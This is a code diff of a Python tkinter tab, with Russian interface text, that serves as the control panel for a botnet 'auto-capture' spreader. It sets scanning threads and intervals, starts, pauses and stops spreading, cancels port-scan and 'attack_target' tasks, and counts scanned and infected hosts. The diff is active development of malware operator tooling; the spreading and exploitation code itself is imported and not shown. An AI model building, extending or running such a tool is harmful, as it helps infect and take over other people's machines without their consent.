@@ -1,156 +1,168 @@
 import tkinter as tk
-from tkinter import ttk, messagebox, scrolledtext
-import json, os, threading, queue, time
+from tkinter import ttk
+import asyncio
+import threading
+import time
 from utils.logger import log
-from utils.widgets import add_copy_paste_support
 from botnet.auto_spreader import AutoSpreader
+from utils.widgets import add_copy_paste_support
 
-class BotAutoTab(tk.Frame):
-    def __init__(self, parent):
+class BotAutoTab(ttk.Frame):
+    def __init__(self, parent, app):
         super().__init__(parent)
-        self.spreader = AutoSpreader()
-        self.build_ui()
-        self.process_messages()
+        self.app = app
+        self.spreader = None
+        self.loop = None
+        self.thread = None
+        self.running = False
+        self.paused_flag = False
+        self.create_widgets()
+        add_copy_paste_support(self)
 
-    def build_ui(self):
-        status_frame = ttk.Frame(self)
-        status_frame.pack(fill=tk.X, padx=5, pady=5)
-        ttk.Label(status_frame, text="Статус:").pack(side=tk.LEFT)
-        self.auto_status_label = ttk.Label(status_frame, text="Неактивен")
-        self.auto_status_label.pack(side=tk.LEFT, padx=5)
-        
-        btn_frame = ttk.Frame(self)
-        btn_frame.pack(fill=tk.X, padx=5, pady=5)
-        self.toggle_btn = ttk.Button(btn_frame, text="Запустить", command=self.toggle_spreader)
-        self.toggle_btn.pack(side=tk.LEFT, padx=2)
-        ttk.Button(btn_frame, text="Принудительный цикл", command=self.force_cycle).pack(side=tk.LEFT, padx=2)
-        ttk.Button(btn_frame, text="Применить настройки", command=self.reload_spreader).pack(side=tk.LEFT, padx=2)
-        
-        settings_frame = ttk.LabelFrame(self, text="Параметры")
+    def create_widgets(self):
+        # Рамка настроек
+        settings_frame = ttk.LabelFrame(self, text="Настройки автозахвата")
         settings_frame.pack(fill=tk.X, padx=5, pady=5)
-        ttk.Label(settings_frame, text="Интервал (сек):").grid(row=0, column=0, padx=5, sticky=tk.W)
-        self.interval_var = tk.StringVar(value="30")
-        interval_entry = ttk.Entry(settings_frame, textvariable=self.interval_var, width=10)
-        interval_entry.grid(row=0, column=1, padx=5, sticky=tk.W)
-        add_copy_paste_support(interval_entry)
-        ttk.Label(settings_frame, text="Потоков:").grid(row=1, column=0, padx=5, sticky=tk.W)
-        self.auto_threads_var = tk.StringVar(value="5000")
-        threads_entry = ttk.Entry(settings_frame, textvariable=self.auto_threads_var, width=10)
-        threads_entry.grid(row=1, column=1, padx=5, sticky=tk.W)
-        add_copy_paste_support(threads_entry)
-        
-        stats_frame = ttk.Frame(self)
-        stats_frame.pack(fill=tk.X, padx=5, pady=2)
-        self.scanned_label = ttk.Label(stats_frame, text="Просканировано: 0", font=('Consolas', 9))
+
+        ttk.Label(settings_frame, text="Интервал (сек):").grid(row=0, column=0, padx=5, pady=5)
+        self.interval_var = tk.IntVar(value=30)
+        ttk.Spinbox(settings_frame, from_=5, to=300, textvariable=self.interval_var, width=10).grid(row=0, column=1, padx=5)
+
+        ttk.Label(settings_frame, text="Потоков:").grid(row=0, column=2, padx=5)
+        self.workers_var = tk.IntVar(value=3000)
+        ttk.Spinbox(settings_frame, from_=100, to=10000, textvariable=self.workers_var, width=10).grid(row=0, column=3, padx=5)
+
+        ttk.Button(settings_frame, text="Применить настройки", command=self.apply_settings).grid(row=0, column=4, padx=10)
+
+        # Кнопки управления
+        control_frame = ttk.Frame(self)
+        control_frame.pack(fill=tk.X, padx=5, pady=5)
+        self.start_btn = ttk.Button(control_frame, text="Запустить", command=self.start_spreader)
+        self.start_btn.pack(side=tk.LEFT, padx=5)
+        self.stop_btn = ttk.Button(control_frame, text="Остановить", command=self.stop_spreader, state=tk.DISABLED)
+        self.stop_btn.pack(side=tk.LEFT, padx=5)
+        self.pause_btn = ttk.Button(control_frame, text="Пауза", command=self.pause_spreader, state=tk.DISABLED)
+        self.pause_btn.pack(side=tk.LEFT, padx=5)
+        self.force_btn = ttk.Button(control_frame, text="Принудительный цикл", command=self.force_cycle)
+        self.force_btn.pack(side=tk.LEFT, padx=5)
+
+        # Индикаторы
+        stats_frame = ttk.LabelFrame(self, text="Статистика")
+        stats_frame.pack(fill=tk.X, padx=5, pady=5)
+        self.scanned_label = ttk.Label(stats_frame, text="Просканировано: 0")
         self.scanned_label.pack(side=tk.LEFT, padx=10)
-        self.infected_label = ttk.Label(stats_frame, text="Заражено: 0", font=('Consolas', 9))
+        self.infected_label = ttk.Label(stats_frame, text="Заражено: 0")
         self.infected_label.pack(side=tk.LEFT, padx=10)
-        
-        self.progress_var = tk.IntVar()
-        self.progress_bar = ttk.Progressbar(self, variable=self.progress_var, maximum=100)
-        self.progress_bar.pack(fill=tk.X, padx=5, pady=2)
-        
-        self.auto_log = scrolledtext.ScrolledText(self, height=10, state=tk.NORMAL, font=('Consolas', 10))
-        self.auto_log.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
-        add_copy_paste_support(self.auto_log)
-        self.auto_log.tag_configure('success', foreground='#00cc00')
-        self.auto_log.tag_configure('error', foreground='#ff4444')
-        self.auto_log.tag_configure('warning', foreground='#ffaa00')
-        self.auto_log.tag_configure('info', foreground='#cccccc')
-        
-        self.load_auto_settings()
+        self.progress = ttk.Progressbar(stats_frame, mode='indeterminate')
+        self.progress.pack(side=tk.LEFT, padx=10, fill=tk.X, expand=True)
 
-    def log_to_auto(self, message):
-        tag = 'info'
-        lower = message.lower()
-        if 'успех' in lower or 'infected' in lower:
-            tag = 'success'
-        elif 'fail' in lower or 'error' in lower or 'ошибка' in lower:
-            tag = 'error'
-        elif 'warning' in lower:
-            tag = 'warning'
-        self.auto_log.insert(tk.END, message + "\n", tag)
-        self.auto_log.see(tk.END)
+        # Лог
+        log_frame = ttk.LabelFrame(self, text="Лог автозахвата")
+        log_frame.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
+        self.log_text = tk.Text(log_frame, height=15, wrap=tk.WORD)
+        scroll = ttk.Scrollbar(log_frame, command=self.log_text.yview)
+        self.log_text.configure(yscrollcommand=scroll.set)
+        self.log_text.pack(side=tk.LEFT, fill=tk.BOTH, expand=True)
+        scroll.pack(side=tk.RIGHT, fill=tk.Y)
 
-    def update_stats_display(self, scanned=None, infected=None):
-        if scanned is not None:
-            self.scanned_label.config(text=f"Просканировано: {scanned}")
-        if infected is not None:
-            self.infected_label.config(text=f"Заражено: {infected}")
+    def apply_settings(self):
+        if self.spreader:
+            self.spreader.interval = self.interval_var.get()
+            self.spreader.max_workers = self.workers_var.get()
+        self.log("Настройки применены")
 
-    def process_messages(self):
-        try:
-            while True:
-                msg = self.spreader.message_queue.get_nowait()
-                if msg.startswith("[Stats]") or msg.startswith("[Live]") or msg.startswith("[Scan]"):
-                    parts = msg.split(',')
-                    scanned = None
-                    infected = None
-                    for part in parts:
-                        if 'Просканировано:' in part:
-                            try: scanned = int(part.split(':')[1].strip())
-                            except: pass
-                        if 'Заражено:' in part:
-                            try: infected = int(part.split(':')[1].strip())
-                            except: pass
-                    self.update_stats_display(scanned=scanned, infected=infected)
-                    self.log_to_auto(msg)
-                elif msg.startswith("[Progress]"):
-                    try:
-                        pct = int(msg.split("(")[1].split("%")[0])
-                        self.progress_var.set(pct)
-                    except: pass
-                else:
-                    self.log_to_auto(msg)
-        except queue.Empty:
-            pass
-        self.after(500, self.process_messages)
+    def start_spreader(self):
+        if self.running:
+            return
+        self.running = True
+        self.paused_flag = False
+        self.start_btn.config(state=tk.DISABLED)
+        self.stop_btn.config(state=tk.NORMAL)
+        self.pause_btn.config(state=tk.NORMAL)
+        self.progress.start(10)
+        self.spreader = AutoSpreader()
+        self.spreader.interval = self.interval_var.get()
+        self.spreader.max_workers = self.workers_var.get()
+        self.loop = asyncio.new_event_loop()
+        def run_loop():
+            asyncio.set_event_loop(self.loop)
+            self.loop.run_forever()
+        self.thread = threading.Thread(target=run_loop, daemon=True)
+        self.thread.start()
+        asyncio.run_coroutine_threadsafe(self.spreader.start(), self.loop)
+        self.log("Автозахват запущен")
 
-    def load_auto_settings(self):
-        try:
-            with open("avz_settings.json") as f:
-                s = json.load(f)
-            self.interval_var.set(str(int(s.get("auto_spread_interval_min", 30)*60)))
-            self.auto_threads_var.set(str(s.get("spread_worker_threads", 5000)))
-            if s.get("auto_spread_enabled"):
-                self.auto_status_label.config(text="Активен")
-                self.toggle_btn.config(text="Остановить")
-        except: pass
+    def stop_spreader(self):
+        if not self.running:
+            return
+        self.running = False
+        self.paused_flag = False
+        if self.spreader:
+            # Останавливаем все задачи корректно
+            async def stop():
+                self.spreader.stop()
+                # Отменяем все активные таски в цикле
+                tasks = [t for t in asyncio.all_tasks(self.loop) if t is not asyncio.current_task()]
+                for t in tasks:
+                    t.cancel()
+                await asyncio.gather(*tasks, return_exceptions=True)
+                self.loop.stop()
+            asyncio.run_coroutine_threadsafe(stop(), self.loop)
+        self.thread.join(timeout=2)
+        self.start_btn.config(state=tk.NORMAL)
+        self.stop_btn.config(state=tk.DISABLED)
+        self.pause_btn.config(state=tk.DISABLED)
+        self.progress.stop()
+        # Автосохранение лога
+        timestamp = time.strftime("%Y%m%d_%H%M%S")
+        filename = f"auto_log_{timestamp}.txt"
+        with open(filename, "w", encoding="utf-8") as f:
+            f.write(self.log_text.get(1.0, tk.END))
+        self.log(f"Лог сохранён в {filename}")
+        self.log("Автозахват остановлен")
 
-    def toggle_spreader(self):
-        if self.spreader.running:
-            self.spreader.stop()
-            self.auto_status_label.config(text="Неактивен")
-            self.toggle_btn.config(text="Запустить")
-            timestamp = time.strftime("%Y%m%d_%H%M%S")
-            filename = f"auto_log_{timestamp}.txt"
-            with open(filename, 'w') as f:
-                f.write(self.auto_log.get(1.0, tk.END))
-            self.log_to_auto(f"[Auto] Лог сохранён: {filename}")
-        else:
-            self.save_auto_settings()
-            self.spreader.load_settings("avz_settings.json")
-            self.spreader.start()
-            self.auto_status_label.config(text="Активен")
-            self.toggle_btn.config(text="Остановить")
+    def pause_spreader(self):
+        if not self.running or self.paused_flag:
+            return
+        self.paused_flag = True
+        if self.spreader:
+            async def pause():
+                self.spreader.pause()
+                # Отменяем все сканирующие таски, но оставляем основной цикл
+                for task in asyncio.all_tasks(self.loop):
+                    if "scan_ports_async" in str(task) or "attack_target" in str(task):
+                        task.cancel()
+            asyncio.run_coroutine_threadsafe(pause(), self.loop)
+        self.pause_btn.config(text="Продолжить", command=self.resume_spreader)
+        self.log("Пауза активирована (все активные сканирования отменены)")
+
+    def resume_spreader(self):
+        if not self.running or not self.paused_flag:
+            return
+        self.paused_flag = False
+        if self.spreader:
+            async def resume():
+                self.spreader.resume()
+            asyncio.run_coroutine_threadsafe(resume(), self.loop)
+        self.pause_btn.config(text="Пауза", command=self.pause_spreader)
+        self.log("Работа продолжена")
 
     def force_cycle(self):
-        if not self.spreader.running:
-            messagebox.showwarning("Неактивен", "Сначала запустите автозахват")
+        if not self.running or self.paused_flag:
+            self.log("Автозахват не активен или на паузе")
             return
-        self.spreader.force_cycle = True
-        self.log_to_auto("[Автозахват] Запрошен принудительный цикл")
+        async def force():
+            await self.spreader.scan_once([])  # вызовет один цикл
+        asyncio.run_coroutine_threadsafe(force(), self.loop)
+        self.log("Принудительный цикл запущен")
 
-    def save_auto_settings(self):
-        try:
-            with open("avz_settings.json","r") as f: s = json.load(f)
-        except: s = {}
-        s["auto_spread_interval_min"] = int(self.interval_var.get()) / 60
-        s["spread_worker_threads"] = int(self.auto_threads_var.get())
-        s["auto_spread_enabled"] = True
-        with open("avz_settings.json","w") as f: json.dump(s, f, indent=2)
+    def log(self, msg):
+        self.log_text.insert(tk.END, f"[{time.strftime('%H:%M:%S')}] {msg}\n")
+        self.log_text.see(tk.END)
+        log(msg, "INFO")
 
-    def reload_spreader(self):
-        self.save_auto_settings()
-        self.spreader.load_settings("avz_settings.json")
-        self.log_to_auto("[Автозахват] Настройки обновлены")
+    def update_stats(self):
+        if self.spreader:
+            self.scanned_label.config(text=f"Просканировано: {self.spreader.stats.get('scanned',0)}")
+            self.infected_label.config(text=f"Заражено: {self.spreader.stats.get('infected',0)}")
+        self.after(500, self.update_stats)
